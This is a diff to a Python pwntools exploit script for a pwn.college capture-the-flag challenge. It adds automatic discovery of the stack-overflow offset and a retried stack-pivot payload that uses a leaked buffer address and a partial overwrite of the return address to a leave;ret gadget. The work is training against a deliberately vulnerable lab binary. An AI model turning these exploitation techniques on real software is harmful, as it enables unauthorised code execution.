@@ -38,44 +38,60 @@ def find_challenge(search_path="/challenge"):
     return xs[0]
 
 
+def find_offset():
+    import shutil
+
+    bin = find_challenge()
+    tmp = f"/tmp/{bin.lstrip('/challenge/')}"
+    shutil.copy2(bin, tmp)
+    io = pwn.process(tmp, level="error")
+    io.sendline(pwn.cyclic(256))
+    io.wait()
+    core = io.corefile
+    fault_val = core.read(core.rsp, 4)
+    offset = pwn.cyclic_find(fault_val)
+    return offset
+
+
 def ctf():
     bin = find_challenge()
+    elf = pwn.ELF(bin, checksec=False)
 
-    io: pwn.process
-    if "gdb" in sys.argv:
-        io = pwn.gdb.debug(
-            bin,
-            gdbscript="""
-            source /opt/gef/gef.py
-            b *challenge+538
-            b *challenge+696
-            """,
+    offset = find_offset()
+
+    for _ in range(0x10):
+        io: pwn.process
+        if "gdb" in sys.argv:
+            io = pwn.gdb.debug(
+                bin,
+                gdbscript="""
+                source /opt/gef/gef.py
+                """,
+            )
+        else:
+            io = pwn.process(bin)
+        tee(io)
+
+        io.recvuntil(b"[LEAK] Your input buffer is located at: ")
+        if not (m := re.match(rb"(0x[0-9a-fA-F]+)\.", io.recvline())):
+            raise ValueError("failed to parse input buffer address")
+        buff_ptr = int(m.group(1), 16)
+
+        rop = pwn.ROP(elf)
+        ins = rop.find_gadget(["leave", "ret"]).address
+
+        payload = pwn.flat(
+            {
+                offset - 0x8: buff_ptr - 0x10,
+                offset + 0x0: (ins & 0xFFFF).to_bytes(2, "little"),
+            }
         )
-    else:
-        io = pwn.process(bin)
-    tee(io)
+        io.send(payload)
 
-    io.recvuntil(b"[LEAK] Your input buffer is located at: ")
-    if not (m := re.match(rb"(0x[0-9a-fA-F]+)\.", io.recvline())):
-        raise ValueError("failed to parse input buffer address")
-    buff_ptr = int(m.group(1), 16)
-
-    pwin_rip = buff_ptr - 0x8
-    pwin_rbp = pwin_rip - 0x8
-
-    payload = pwn.flat(
-        {
-            0x78: pwin_rbp,
-            0x80: 0x14AE.to_bytes(2, "little"),  # address of leave; ret
-        }
-    )
-    io.send(payload)
-
-    if b"pwn.college{" in io.recvrepeat():
-        pwn.success("Found the flag!")
-        exit(0)
+        if b"pwn.college{" in io.recvrepeat():
+            pwn.success("Found the flag!")
+            exit(0)
 
 
 if __name__ == "__main__":
-    for nibble in range(0x100):
-        ctf()
+    ctf()
